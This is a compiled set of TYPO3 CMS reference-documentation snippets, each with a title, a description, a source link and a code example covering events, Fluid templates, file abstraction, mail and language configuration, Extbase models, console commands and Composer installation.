// Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extending Existing Login Provider in TYPO3\nDESCRIPTION: Example of extending an existing login provider by overriding its provider class with a custom implementation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/LoginProvider.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['EXTCONF']['backend']['loginProviders'][1433416020]['provider'] =\n    \\MyVendor\\MyExtension\\LoginProvider\\CustomProviderExtendingUsernamePasswordLoginProvider::class\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyButtonBarEvent Class for TYPO3 Backend in PHP\nDESCRIPTION: This class provides methods to get and set buttons in the TYPO3 backend module docheader. It includes getButtons(), setButtons(), and getButtonBar() methods for managing the button bar components.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyButtonBarEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Backend\\Template\\Components\n\n..  php:class:: ModifyButtonBarEvent\n\n    Listeners can modify the buttons of the button bar in the backend module docheader\n\n    ..  php:method:: getButtons()\n        :returns: `array`\n\n    ..  php:method:: setButtons(array $buttons)\n\n        :param $buttons: the buttons\n\n    ..  php:method:: getButtonBar()\n        :returns: `\\TYPO3\\CMS\\Backend\\Template\\Components\\ButtonBar`\n```\n\n----------------------------------------\n\nTITLE: Retrieving Workspace-Overlaid Records in TYPO3\nDESCRIPTION: Shows how to use BackendUtility::getRecordWSOL() to fetch a record and overlay it with its workspace version if available. This is equivalent to calling BackendUtility::getRecord() followed by BackendUtility::workspaceOL().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Workspaces/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n// use \\TYPO3\\CMS\\Backend\\Utility\\BackendUtility\n$row = BackendUtility::getRecordWSOL($table, $uid);\n// This is the same as:\n$row = BackendUtility::getRecord($table, $uid);\nBackendUtility::workspaceOL($table, $row);\n```\n\n----------------------------------------\n\nTITLE: Configuring Mount Point Data in TYPO3\nDESCRIPTION: This snippet demonstrates how to configure a mount point in TYPO3. It shows the title, URL segment, target page, and display option for a mount point.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MountPoints/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: none\nCODE:\n```\nTitle         :  Basic Mount Point\nURL segment   :  basic-mountpoint\nTarget page   :  Company\nDisplay option:  \"Show the mounted page\" (subpages included)\n```\n\n----------------------------------------\n\nTITLE: Accessing TYPO3 Backend Module Information in PHP\nDESCRIPTION: This snippet demonstrates how to retrieve the module object from a backend request and get its identifier. It uses the 'getAttribute' method to access the module information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/Module.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$module = $request->getAttribute('module');\n$identifier = $route->getIdentifier();\n```\n\n----------------------------------------\n\nTITLE: BeforeFileCreatedEvent Class Definition with Methods\nDESCRIPTION: PHP class definition for BeforeFileCreatedEvent that fires before file creation in TYPO3 storage. Includes methods to get the filename and target folder information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Resource/BeforeFileCreatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Resource\\Event;\n\nclass BeforeFileCreatedEvent\n{\n    public function getFileName(): string\n    {\n        // Returns the filename\n    }\n\n    public function getFolder(): \\TYPO3\\CMS\\Core\\Resource\\Folder\n    {\n        // Returns the target folder\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Extbase Validate Annotation Example\nDESCRIPTION: This code demonstrates the `Validate` annotation, used to configure validators for properties in Extbase models. It references a validator class that will be used when the property is being processed. The annotation is specified above the property definition.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Extbase/Reference/Annotations.rst#2025-04-16_snippet_1\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace TYPO3Documentation\\BlogExample\\Domain\\Model;\n\nuse TYPO3\\CMS\\Extbase\\Annotation as Extbase;\n\nclass Blog extends \\TYPO3\\CMS\\Extbase\\DomainObject\\AbstractEntity\n{\n    /**\n     * @var string\n     */\n    protected $title = '';\n\n    /**\n     * @var string\n     * @Extbase\\Validate(\"NotEmpty\")\n     */\n    protected $description = '';\n\n    /**\n     * @var \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     */\n    protected $posts = null;\n\n    /**\n     * __construct\n     */\n    public function __construct()\n    {\n        //Do not modify this method. It enables initialization of all ObjectStorage properties.\n        //See https://docs.typo3.org/typo3cms/ExtbaseFluidBook/6-Persistence/2-model-properties.html\n        $this->posts = new \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage();\n    }\n\n    /**\n     * Returns the title\n     *\n     * @return string $title\n     */\n    public function getTitle()\n    {\n        return $this->title;\n    }\n\n    /**\n     * Sets the title\n     *\n     * @param string $title\n     * @return void\n     */\n    public function setTitle(string $title)\n    {\n        $this->title = $title;\n    }\n\n    /**\n     * Returns the description\n     *\n     * @return string $description\n     */\n    public function getDescription()\n    {\n        return $this->description;\n    }\n\n    /**\n     * Sets the description\n     *\n     * @param string $description\n     * @return void\n     */\n    public function setDescription(string $description)\n    {\n        $this->description = $description;\n    }\n\n    /**\n     * Adds a Post\n     *\n     * @param Post $post\n     * @return void\n     */\n    public function addPost(Post $post)\n    {\n        $this->posts->attach($post);\n    }\n\n    /**\n     * Removes a Post\n     *\n     * @param Post $postToRemove The Post to be removed\n     * @return void\n     */\n    public function removePost(Post $postToRemove)\n    {\n        $this->posts->detach($postToRemove);\n    }\n\n    /**\n     * Returns the posts\n     *\n     * @return \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post>\n     */\n    public function getPosts()\n    {\n        return $this->posts;\n    }\n\n    /**\n     * Sets the posts\n     *\n     * @param \\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage<Post> $posts\n     * @return void\n     */\n    public function setPosts(\\TYPO3\\CMS\\Extbase\\Persistence\\ObjectStorage $posts)\n    {\n        $this->posts = $posts;\n    }\n}\n\n```\n\n----------------------------------------\n\nTITLE: RST Table of Contents for RTE Transformations\nDESCRIPTION: ReStructuredText markup defining the documentation structure for RTE transformations, including include directive and table of contents.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Transformations/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. include:: /Includes.rst.txt\n.. _transformations:\n\n===================\nRTE Transformations\n===================\n\n\n.. toctree::\n   :titlesonly:\n\n   Introduction\n   Overview\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom ViewHelper with AbstractTagBasedViewHelper\nDESCRIPTION: Enhanced implementation of the Gravatar ViewHelper using AbstractTagBasedViewHelper. This approach uses the TagBuilder to create HTML tags with proper attribute escaping and supports arbitrary tag attributes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/DevelopCustomViewhelper.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\ViewHelpers;\n\nuse TYPO3Fluid\\Fluid\\Core\\ViewHelper\\AbstractTagBasedViewHelper;\n\nclass GravatarViewHelper extends AbstractTagBasedViewHelper\n{\n    protected $tagName = 'img';\n\n    public function initializeArguments(): void\n    {\n        parent::initializeArguments();\n\n        $this->registerArgument(\n            'emailAddress',\n            'string',\n            'The email address to resolve the gravatar for',\n            true\n        );\n    }\n\n    public function render(): string\n    {\n        $emailAddress = $this->arguments['emailAddress'];\n\n        $gravatarUri = 'https://www.gravatar.com/avatar/'\n            . md5(strtolower(trim($emailAddress)))\n            . '?d=identicon';\n\n        $this->tag->addAttribute('src', $gravatarUri);\n\n        return $this->tag->render();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Content Element Preview with TSconfig\nDESCRIPTION: Page TSconfig configuration to specify a custom Fluid template for content element preview rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/ContentElements/CustomBackendPreview.rst#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nmod.web_layout {\n  tt_content {\n    preview {\n      # Your CType\n      example_ctype = EXT:my_extension/Resources/Private/Templates/Preview/ExampleCType.html\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using IntrospectionProcessor Configuration in TYPO3\nDESCRIPTION: Example of the IntrospectionProcessor configuration options including appendFullBackTrace and shiftBackTraceLevel for controlling backtrace information.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Logging/Processors/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nfalse\n```\n\n----------------------------------------\n\nTITLE: Outputting Variables in Fluid Templates\nDESCRIPTION: Shows how to output a variable in a Fluid template by wrapping the variable name in curly braces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_1\n\nLANGUAGE: html\nCODE:\n```\n<h1>{title}</h1>\n```\n\n----------------------------------------\n\nTITLE: Equivalent Array Structure in YAML\nDESCRIPTION: Shows the equivalent YAML representation of the PHP arrays, demonstrating both mapping (key-value pairs) and sequence (list) structures with proper indentation using 2 spaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/YamlApi/Syntax.rst#2025-04-16_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# mapping (key / value pairs)\na:\n  key1: 'value'\n  key2:\n    key2_1: 'value'\n\n# sequence (list)\nb:\n  - 'apples'\n  - 'oranges'\n  - 'bananas'\n```\n\n----------------------------------------\n\nTITLE: Getting File by Filename from Folder Object in TYPO3 FAL\nDESCRIPTION: Example of getting a file using its filename from an existing folder object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n$file = $folder->getFile('filename.jpg');\n```\n\n----------------------------------------\n\nTITLE: CountryProvider Class Definition\nDESCRIPTION: Defines the `CountryProvider` class within the `TYPO3\\CMS\\Core\\Country` namespace. This class is responsible for providing information about countries, sourcing its data from a script that updates from an external ISO database.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Country/CountryProvider.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:class:: CountryProvider\n\n    A class providing information about all countries.\n\n    Country data is generated from \"Build/Scripts/updateIsoDatabase.php\" (which in turn stems from https://github.com/sokil/php-isocodes-db-i18n)\n```\n\n----------------------------------------\n\nTITLE: Defining AfterContentObjectRendererInitializedEvent PHP Class\nDESCRIPTION: PHP class definition for handling content object renderer initialization events in TYPO3 CMS. The class provides functionality to access and modify the ContentObjectRenderer instance after initialization through the getContentObjectRenderer() method.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterContentObjectRendererInitializedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass AfterContentObjectRendererInitializedEvent\n{\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n    {\n        // Method implementation\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Partial Root Paths - TYPO3 PHP\nDESCRIPTION: This snippet defines the paths where partial templates are located for templated emails, with specified default values.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['partialRootPaths'] = [\n    0 => 'EXT:core/Resources/Private/Partials/',\n    10 => 'EXT:backend/Resources/Private/Partials/',\n];\n```\n\n----------------------------------------\n\nTITLE: Getting File by Combined Identifier in TYPO3 FAL\nDESCRIPTION: Demonstrates how to get a file using its combined storage and file identifier.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$file = $resourceFactory->getFileObjectFromCombinedIdentifier('1:/path/to/file.jpg');\n```\n\n----------------------------------------\n\nTITLE: Middleware Language Service Factory Injection\nDESCRIPTION: Shows dependency injection setup for LanguageServiceFactory in a middleware context.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/Localization/Php.rst#2025-04-16_snippet_5\n\nLANGUAGE: php\nCODE:\n```\npublic function __construct(\n    private readonly LanguageServiceFactory $languageServiceFactory,\n    private readonly ResponseFactoryInterface $responseFactory,\n    private readonly StreamFactoryInterface $streamFactory\n) {}\n```\n\n----------------------------------------\n\nTITLE: Inserting Figure for Backend User Groups Module in TYPO3 Documentation\nDESCRIPTION: This RST directive inserts a figure showing the Backend User Groups module interface in the TYPO3 documentation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/UserManagement/BackendUsers/Index.rst#2025-04-16_snippet_8\n\nLANGUAGE: rst\nCODE:\n```\n..  figure:: /Images/ManualScreenshots/UserManagement/Module/BackendUserGroupsModule.png\n    :alt: Screenshot of the Module \"Backend Users\", submodule \"Backend User Groups\" in the TYPO3 Backend\n```\n\n----------------------------------------\n\nTITLE: Setting SMTP Stream Options - TYPO3 PHP\nDESCRIPTION: This snippet specifies additional stream options when sending emails over SMTP, useful for customizing connections based on server requirements.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/MAIL.rst#2025-04-16_snippet_8\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['MAIL']['transport_smtp_stream_options'] = null;\n```\n\n----------------------------------------\n\nTITLE: Defining EnrichPasswordValidationContextDataEvent Class in TYPO3 CMS Core\nDESCRIPTION: Documentation for the EnrichPasswordValidationContextDataEvent class in the TYPO3 CMS Core password policy system. This event is dispatched before the ContextData DTO is passed to the password policy validator and provides methods to retrieve context data, user data, and the initiating class name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/PasswordPolicy/EnrichPasswordValidationContextDataEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\PasswordPolicy\\Event;\n\nclass EnrichPasswordValidationContextDataEvent\n{\n    // Event is dispatched before the `ContextData` DTO is passed to the password policy validator.\n    // \n    // Note, that the `$userData` array will include user data available from the initiating class only.\n    // Event listeners should therefore always consider the initiating class name when accessing data\n    // from `getUserData()`.\n    \n    public function getContextData(): \\TYPO3\\CMS\\Core\\PasswordPolicy\\Validator\\Dto\\ContextData\n    {\n        // Implementation not shown\n    }\n    \n    public function getUserData(): array\n    {\n        // Implementation not shown\n    }\n    \n    public function getInitiatingClass(): string\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining the AfterStdWrapFunctionsExecutedEvent class in TYPO3 CMS\nDESCRIPTION: This code snippet defines the AfterStdWrapFunctionsExecutedEvent class in the TYPO3 CMS Frontend ContentObject namespace. The event is triggered after content has been processed by stdWrap functions and provides methods to get and set content, access configuration, and retrieve the ContentObjectRenderer instance.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterStdWrapFunctionsExecutedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass AfterStdWrapFunctionsExecutedEvent\n{\n    // Event is called after the content has been modified by the rest of the stdWrap functions\n\n    public function getContent(): ?string\n    {\n        // Returns content after stdWrap processing\n    }\n\n    public function setContent(string $content)\n    {\n        // Sets the content\n    }\n\n    public function getConfiguration(): array\n    {\n        // Returns the configuration array\n    }\n\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n    {\n        // Returns the ContentObjectRenderer instance\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Referencing TYPO3 ExpressionBuilder Class in PHP\nDESCRIPTION: The fully qualified class name for the ExpressionBuilder class used to model complex expressions, particularly for WHERE and JOIN conditions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/ClassOverview/Index.rst#2025-04-16_snippet_2\n\nLANGUAGE: PHP\nCODE:\n```\nTYPO3\\CMS\\Core\\Database\\Query\\Expression\\ExpressionBuilder\n```\n\n----------------------------------------\n\nTITLE: Implementing Basic TYPO3 Console Command\nDESCRIPTION: Demonstrates the implementation of a simple console command in TYPO3 using Symfony's Command component. The command doesn't perform any actual operations but shows the basic structure including configuration and execution methods.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Tutorials/Command/Classes/DoSomethingCommand.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\n/*\n * This file is part of the TYPO3 CMS project. [...]\n */\n\nnamespace T3docs\\Examples\\Command;\n\nuse Symfony\\Component\\Console\\Command\\Command;\nuse Symfony\\Component\\Console\\Input\\InputInterface;\nuse Symfony\\Component\\Console\\Output\\OutputInterface;\n\nfinal class DoSomethingCommand extends Command\n{\n    protected function configure(): void\n    {\n        $this->setHelp('This command does nothing. It always succeeds.');\n    }\n\n    protected function execute(InputInterface $input, OutputInterface $output): int\n    {\n        // Do awesome stuff\n        return Command::SUCCESS;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Getting Minimum Lifetime from Cache Tags in TYPO3 CMS (PHP)\nDESCRIPTION: This example demonstrates how to retrieve the minimum lifetime calculated from all cache tags. The resolveLifetime method returns the smallest lifetime value among all the registered cache tags.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/RequestAttributes/FrontendCacheCollector.rst#2025-04-16_snippet_4\n\nLANGUAGE: php\nCODE:\n```\n$cacheDataCollector = $request->getAttribute('frontend.cache.collector');\n$cacheDataCollector->resolveLifetime();\n```\n\n----------------------------------------\n\nTITLE: Documenting CKEditor Integration in TYPO3\nDESCRIPTION: This RST code snippet provides information about the CKEditor integration in TYPO3 via the typo3/cms-rte-ckeditor system extension. It includes references to further documentation for configuration and usage.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: rst\nCODE:\n```\n.. _rte_ckeditor:\n\nCKEditor rich text editor\n=========================\n\nTYPO3 comes with the system extension :composer:`typo3/cms-rte-ckeditor`\n\"CKEditor Rich Text Editor\" which integrates CKEditor\nfunctionality into the Core for editing of rich text content.\n\n..  seealso::\n    *   `TYPO3 RTE by CKEditor <https://docs.typo3.org/permalink/typo3/cms-rte-ckeditor:start>`_\n    *   `Configuration Quickstart <https://docs.typo3.org/permalink/typo3/cms-rte-ckeditor:config-quickstart>`_\n    *   `Configuration Examples <https://docs.typo3.org/permalink/typo3/cms-rte-ckeditor:config-examples>`_\n    *   `Configuration Reference <https://docs.typo3.org/permalink/typo3/cms-rte-ckeditor:config-ref>`_\n```\n\n----------------------------------------\n\nTITLE: Referencing ModuleTemplateFactory and ViewInterface in PHP\nDESCRIPTION: This snippet shows the namespace for the ViewInterface implemented by ModuleTemplate, allowing values to be assigned to it in controller actions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/BackendModules/ModuleTemplate.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\View\\ViewInterface\n```\n\n----------------------------------------\n\nTITLE: Including RST Directives for TYPO3 Documentation\nDESCRIPTION: ReStructuredText directives for including common TYPO3 documentation elements and setting up index entries.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/ModifyRecordListRecordActionsEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n..  include:: /Includes.rst.txt\n..  index:: Events; ModifyRecordListHeaderColumnsEvent\n..  _ModifyRecordListRecordActionsEvent:\n```\n\n----------------------------------------\n\nTITLE: PHP SetRegistry Get Set\nDESCRIPTION: Shows how to read a single site set definition without dependencies.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/SiteHandling/SiteSets.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n$set = $setRegistry->getSet('my-vendor/my-set');\n```\n\n----------------------------------------\n\nTITLE: Configuring Image File Extensions in TYPO3\nDESCRIPTION: This configuration sets the allowed image file extensions for TYPO3. It is essential for handling uploaded images correctly, and the specified extensions must be in lowercase without spaces.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Configuration/Typo3ConfVars/GFX.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['GFX']['imagefile_ext'] = 'gif,jpg,jpeg,tif,tiff,bmp,pcx,tga,png,pdf,ai,svg,webp';\n```\n\n----------------------------------------\n\nTITLE: Accessing Object Properties in Fluid Templates\nDESCRIPTION: Demonstrates how to access object properties using the dot notation in a Fluid template.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/Syntax.rst#2025-04-16_snippet_11\n\nLANGUAGE: html\nCODE:\n```\n<p>{product.name}: {product.price}</p>\n```\n\n----------------------------------------\n\nTITLE: Defining Custom Language in TYPO3 Configuration\nDESCRIPTION: PHP configuration to add a custom language (Swiss German) to TYPO3. This sets up the language code and display name.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Localization/ManagingTranslations.rst#2025-04-16_snippet_6\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['SYS']['localization']['locales']['user'] = [\n    'gsw_CH' => 'Swiss German',\n];\n```\n\n----------------------------------------\n\nTITLE: Defining SwitchUserEvent Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the SwitchUserEvent class in the TYPO3 CMS backend authentication namespace. It includes properties for the original and target user, as well as methods to get and set these users.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Backend/SwitchUserEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class SwitchUserEvent\n{\n    private BackendUserAuthentication $originalUser;\n    private BackendUserAuthentication $targetUser;\n\n    public function __construct(BackendUserAuthentication $originalUser, BackendUserAuthentication $targetUser)\n    {\n        $this->originalUser = $originalUser;\n        $this->targetUser = $targetUser;\n    }\n\n    public function getOriginalUser(): BackendUserAuthentication\n    {\n        return $this->originalUser;\n    }\n\n    public function getTargetUser(): BackendUserAuthentication\n    {\n        return $this->targetUser;\n    }\n\n    public function setTargetUser(BackendUserAuthentication $targetUser): void\n    {\n        $this->targetUser = $targetUser;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterGetDataResolvedEvent Class in TYPO3 Frontend ContentObject\nDESCRIPTION: Class definition for AfterGetDataResolvedEvent in the TYPO3 CMS Frontend ContentObject namespace. This event class allows listeners to modify the result of ContentObjectRenderer->getData() method after data resolution has occurred.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterGetDataResolvedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:namespace::  TYPO3\\CMS\\Frontend\\ContentObject\\Event\n\n..  php:class:: AfterGetDataResolvedEvent\n\n    Listeners are able to modify the resolved ContentObjectRenderer->getData() result\n\n    ..  php:method:: getResult()\n        :returns: `?mixed`\n\n    ..  php:method:: setResult(?mixed $result)\n\n        :param $result: the result\n\n    ..  php:method:: getParameterString()\n        :returns: `string`\n\n    ..  php:method:: getAlternativeFieldArray()\n        :returns: `array`\n\n    ..  php:method:: getContentObjectRenderer()\n        :returns: `\\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer`\n```\n\n----------------------------------------\n\nTITLE: Getting File by UID in TYPO3 FAL\nDESCRIPTION: Example of retrieving a file object using its unique identifier from the FAL system.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fal/UsingFal/ExamplesFileFolder.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n$resourceFactory = \\TYPO3\\CMS\\Core\\Resource\\ResourceFactory::getInstance();\n$file = $resourceFactory->getFileObject(4);\n```\n\n----------------------------------------\n\nTITLE: Passing Data to cObject ViewHelper\nDESCRIPTION: Shows different methods of passing data to the cObject ViewHelper, including direct content and data attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Fluid/UsingTypoScriptCObjectViewHelper.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n<f:cObject typoscriptObjectPath=\"lib.myCounter\">{post.viewCount}</f:cObject>\n```\n\nLANGUAGE: html\nCODE:\n```\n<f:cObject typoscriptObjectPath=\"lib.myCounter\" data=\"{post.viewCount}\" />\n```\n\nLANGUAGE: html\nCODE:\n```\n{post.viewCount -> f:cObject(typoscriptObjectPath: 'lib.myCounter')}\n```\n\n----------------------------------------\n\nTITLE: TYPO3 First Installation Command\nDESCRIPTION: Console command for performing the first installation of TYPO3. This achieves the same result as placing the FIRST_INSTALL flag file in the appropriate directory.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/FlagFiles.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n# Lock the TYPO3 Backend for everyone including administrators\nvendor/bin/typo3 setup\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Extension via Composer\nDESCRIPTION: Command to require and install a specific version of a TYPO3 extension using Composer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require foo/bar:~1.0.0\n```\n\n----------------------------------------\n\nTITLE: PHP Class Definition for ModifyImageSourceCollectionEvent\nDESCRIPTION: Class definition for handling image source collection modifications in TYPO3 CMS. Contains methods for getting and setting source collections, configurations, and accessing the ContentObjectRenderer.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/ModifyImageSourceCollectionEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nnamespace TYPO3\\CMS\\Frontend\\ContentObject\\Event;\n\nclass ModifyImageSourceCollectionEvent\n{\n    public function setSourceCollection(string $sourceCollection)\n    public function getSourceCollection(): string\n    public function getFullSourceCollection(): string\n    public function getSourceConfiguration(): array\n    public function getSourceRenderConfiguration(): array\n    public function getContentObjectRenderer(): \\TYPO3\\CMS\\Frontend\\ContentObject\\ContentObjectRenderer\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Link Handler in TYPO3 CMS\nDESCRIPTION: This method sets a link handler by name, overwriting it if it already exists. It takes the handler name (including trailing period) and the handler definition as parameters.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyLinkHandlersEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\nphp:method:: 